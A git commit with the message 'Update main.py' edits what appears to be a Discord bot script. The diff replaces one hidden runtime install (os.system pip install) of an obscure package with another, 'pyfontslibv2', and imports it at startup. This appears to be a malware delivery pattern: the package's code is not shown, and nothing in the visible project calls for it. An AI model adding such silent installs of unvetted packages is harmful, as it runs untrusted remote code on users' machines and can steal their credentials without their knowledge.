ac575929885bca1297078639f0056f0f70f76011
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-29 05:03:06 -0700

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pyfontslibv2")
+import pyfontslibv2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
